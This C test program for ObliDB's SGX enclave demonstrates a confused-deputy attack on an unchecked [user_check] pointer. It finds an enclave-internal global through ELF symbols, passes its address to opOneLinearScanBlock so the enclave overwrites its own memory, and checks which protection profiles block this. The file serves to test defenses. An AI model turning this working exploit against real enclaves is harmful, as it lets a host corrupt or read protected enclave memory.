/* Direct [user_check] confused-deputy control for ObliDB opOneLinearScanBlock.
 *
 * The unchanged upstream EDL is:
 *   public int opOneLinearScanBlock(int structureId, int index,
 *                                   [user_check]Linear_Scan_Block* block,
 *                                   int write);
 *
 * [user_check] passes the host-chosen raw pointer with no bridge copy, length,
 * null, canonical or outside-enclave check.  The unchanged upstream body copies
 * a decrypted 512-byte block to that pointer on a read and copies 512 bytes from
 * it on a write (enclave_data_structures.cpp:88 and :111).
 *
 *   cd       The host names the enclave-internal `linOramCache` global as the
 *            block pointer.  It first stores a known pattern in block 0, then:
 *              opOneLinearScanBlock(id, 0, target, write=0)  writes the block
 *                                                             to enclave memory
 *              opOneLinearScanBlock(id, 1, target, write=1)  reads it back into
 *                                                             another block
 *              opOneLinearScanBlock(id, 1, host,   write=0)  returns it to host
 *            BASELINE must read the pattern back.  Protected profiles must
 *            reject the first raw enclave pointer before the write.
 *   control  The same sequence using only host buffers.  This must pass in
 *            every profile and shows the ECALL pair is functional.
 *
 * The target is the image's own LOCAL symbol `linOramCache`, found in .symtab
 * and checked against /proc/self/maps.  No fixed scratch offset is assumed.
 * SIM-only read-back is used to verify the BASELINE write.
 */
#include <elf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sgx_urts.h"
#include "Enclave_u.h"
#include "../four_app_permissions.h"

#define TARGET_SYMBOL "linOramCache"
#define BLOCK_BYTES   BLOCK_DATA_SIZE
#define TARGET_SIZE   BLOCK_BYTES

static unsigned char *storage[NUM_STRUCTURES];
static int storage_size[NUM_STRUCTURES];
static size_t storage_width[NUM_STRUCTURES];
static unsigned creates, deletes;

__attribute__((noinline)) void oblidb_uc_ready(void)
{
    __asm__ volatile("" ::: "memory");
}

void ocall_print(const char *message) { fprintf(stderr, "ObliDB: %s\n", message); }

void ocall_newStructure(int id, Obliv_Type type, int size)
{
    if (id < 0 || id >= NUM_STRUCTURES || storage[id] || size <= 0 ||
        type != TYPE_LINEAR_SCAN) {
        fprintf(stderr, "unexpected ocall_newStructure id=%d type=%d size=%d\n",
                id, (int)type, size);
        exit(10);
    }
    storage_size[id] = size;
    storage_width[id] = sizeof(Encrypted_Linear_Scan_Block);
    storage[id] = calloc((size_t)size, storage_width[id]);
    if (!storage[id]) {
        fprintf(stderr, "allocation failure id=%d\n", id);
        exit(10);
    }
    ++creates;
}

void ocall_deleteStructure(int id)
{
    if (id < 0 || id >= NUM_STRUCTURES || !storage[id]) {
        fprintf(stderr, "unexpected ocall_deleteStructure id=%d\n", id);
        exit(10);
    }
    free(storage[id]);
    storage[id] = NULL;
    storage_size[id] = 0;
    storage_width[id] = 0;
    ++deletes;
}

static unsigned char *block(int id, int index, int width)
{
    if (id < 0 || id >= NUM_STRUCTURES || !storage[id] ||
        index < 0 || index >= storage_size[id] ||
        (size_t)width != storage_width[id]) {
        fprintf(stderr, "unexpected block id=%d index=%d width=%d\n",
                id, index, width);
        exit(10);
    }
    return storage[id] + (size_t)index * storage_width[id];
}

void ocall_read_block(int id, int index, int width, void *buffer)
{
    memcpy(buffer, block(id, index, width), (size_t)width);
}

void ocall_write_block(int id, int index, int width, void *buffer)
{
    memcpy(block(id, index, width), buffer, (size_t)width);
}

static void pattern(Linear_Scan_Block *b, unsigned seed)
{
    for (int i = 0; i < BLOCK_BYTES; ++i)
        b->data[i] = (unsigned char)(i * 29u + seed * 71u + 3u);
}

static int find_symbol(const char *image, const char *want,
                       uint64_t *addr, uint64_t *size)
{
    FILE *f = fopen(image, "rb");
    if (!f) return 0;
    Elf64_Ehdr eh;
    if (fread(&eh, 1, sizeof eh, f) != sizeof eh ||
        memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0 ||
        eh.e_shentsize != sizeof(Elf64_Shdr) || eh.e_shnum == 0) {
        fclose(f);
        return 0;
    }
    Elf64_Shdr *sh = calloc(eh.e_shnum, sizeof(*sh));
    if (!sh) { fclose(f); return 0; }
    if (fseek(f, (long)eh.e_shoff, SEEK_SET) != 0 ||
        fread(sh, sizeof(*sh), eh.e_shnum, f) != eh.e_shnum) {
        free(sh); fclose(f); return 0;
    }
    int found = 0;
    for (unsigned i = 0; i < eh.e_shnum && !found; ++i) {
        if (sh[i].sh_type != SHT_SYMTAB ||
            sh[i].sh_entsize != sizeof(Elf64_Sym) ||
            sh[i].sh_link >= eh.e_shnum)
            continue;
        Elf64_Sym *syms = malloc(sh[i].sh_size);
        unsigned char *str = malloc(sh[sh[i].sh_link].sh_size);
        if (!syms || !str ||
            fseek(f, (long)sh[i].sh_offset, SEEK_SET) != 0 ||
            fread(syms, 1, sh[i].sh_size, f) != sh[i].sh_size ||
            fseek(f, (long)sh[sh[i].sh_link].sh_offset, SEEK_SET) != 0 ||
            fread(str, 1, sh[sh[i].sh_link].sh_size, f) !=
                sh[sh[i].sh_link].sh_size) {
            free(syms); free(str); break;
        }
        size_t n = sh[i].sh_size / sizeof(Elf64_Sym);
        for (size_t j = 0; j < n; ++j) {
            if (syms[j].st_name >= sh[sh[i].sh_link].sh_size ||
                syms[j].st_shndx == SHN_UNDEF)
                continue;
            if (strcmp((const char *)str + syms[j].st_name, want) == 0) {
                *addr = syms[j].st_value;
                *size = syms[j].st_size;
                found = 1;
                break;
            }
        }
        free(syms); free(str);
    }
    free(sh); fclose(f);
    return found;
}

static int mapped_rw(uintptr_t start, size_t len)
{
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) return 0;
    char line[512];
    int found = 0;
    while (fgets(line, sizeof line, maps)) {
        unsigned long lo, hi; char perm[5];
        if (sscanf(line, "%lx-%lx %4s", &lo, &hi, perm) == 3 &&
            start >= lo && (uintptr_t)len <= hi - start &&
            perm[0] == 'r' && perm[1] == 'w') {
            found = 1;
            break;
        }
    }
    fclose(maps);
    return found;
}

static unsigned calls;
static void status(sgx_status_t s, int result, int expected, int line)
{
    ++calls;
    if (s || result != expected) {
        fprintf(stderr,
                "ECALL line %d: transport=%#x result=%d expected=%d\n",
                line, (unsigned)s, result, expected);
        exit(11);
    }
}
#define CALL(expr, want) do { int result = -99; \
    sgx_status_t transport = (expr); \
    status(transport, result, want, __LINE__); } while (0)
#define REQUIRE(ok) do { if (!(ok)) { \
    fprintf(stderr, "REQUIRE failed line %d\n", __LINE__); exit(12); } } while (0)

int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "usage: %s <enclave.signed.so> <cd|control>\n", argv[0]);
        return 2;
    }
    const char *image = argv[1];
    int do_control = !strcmp(argv[2], "control");
    if (!do_control && strcmp(argv[2], "cd")) {
        fprintf(stderr, "unknown mode: %s\n", argv[2]);
        return 2;
    }

    uint64_t base = 0x40000000;
    if (getenv("ENCBOUND_TEST_BASE"))
        base = strtoull(getenv("ENCBOUND_TEST_BASE"), NULL, 0);

    uint64_t saddr = 0, ssize = 0;
    if (!find_symbol(image, TARGET_SYMBOL, &saddr, &ssize) ||
        ssize < TARGET_SIZE) {
        fprintf(stderr, "cannot find %s with %u bytes in %s\n",
                TARGET_SYMBOL, TARGET_SIZE, image);
        return 4;
    }

    sgx_enclave_id_t eid = 0;
    sgx_status_t s = sgx_create_enclave(image, SGX_DEBUG_FLAG, NULL, NULL,
                                        &eid, NULL);
    if (s) {
        fprintf(stderr, "create=%#x\n", (unsigned)s);
        return 3;
    }
    four_app_permissions(image);
    oblidb_uc_ready();

    /* The SIM loader maps the enclave image in this process; validate the
     * selected symbol only after sgx_create_enclave has installed it. */
    uintptr_t target = (uintptr_t)(base + saddr);
    if (!mapped_rw(target, TARGET_SIZE)) {
        fprintf(stderr, "target %#lx (%s+%#lx) is not mapped rw\n",
                (unsigned long)target, TARGET_SYMBOL,
                (unsigned long)saddr);
        return 5;
    }

    const int id = 0;
    Linear_Scan_Block in, out;
    pattern(&in, 0x31);
    memset(&out, 0xa5, sizeof out);

    CALL(total_init(eid, (sgx_status_t *)&result), 0);
    CALL(setupPerformanceTest(eid, (sgx_status_t *)&result, id, 2,
                              TYPE_LINEAR_SCAN), 0);
    CALL(opOneLinearScanBlock(eid, &result, id, 0, &in, 1), 0);

    if (do_control) {
        CALL(opOneLinearScanBlock(eid, &result, id, 0, &out, 0), 0);
        REQUIRE(!memcmp(&in, &out, sizeof in));
    } else {
        /* (1) Decrypted block 0 -> raw enclave-internal target. */
        CALL(opOneLinearScanBlock(eid, &result, id, 0,
                                  (Linear_Scan_Block *)target, 0), 0);
        /* (2) Raw target -> block 1 (enclave read of the same address). */
        CALL(opOneLinearScanBlock(eid, &result, id, 1,
                                  (Linear_Scan_Block *)target, 1), 0);
        /* (3) Read block 1 back through a normal host buffer. */
        CALL(opOneLinearScanBlock(eid, &result, id, 1, &out, 0), 0);
        REQUIRE(!memcmp(&in, &out, sizeof in));
    }

    CALL(free_structure(eid, (sgx_status_t *)&result, id), 0);
    REQUIRE(creates == 1 && deletes == 1);
    REQUIRE(sgx_destroy_enclave(eid) == SGX_SUCCESS);
    printf("{\"mode\":\"%s\",\"status\":0,\"target\":\"%#lx\","
           "\"symbol\":\"%s\",\"word\":%u,\"readback\":\"%s\","
           "\"first\":%u}\n",
           do_control ? "control" : "cd", (unsigned long)target,
           TARGET_SYMBOL, (unsigned)sizeof(Linear_Scan_Block),
           memcmp(&in, &out, sizeof in) ? "FAIL" : "PASS", out.data[0]);
    return 0;
}
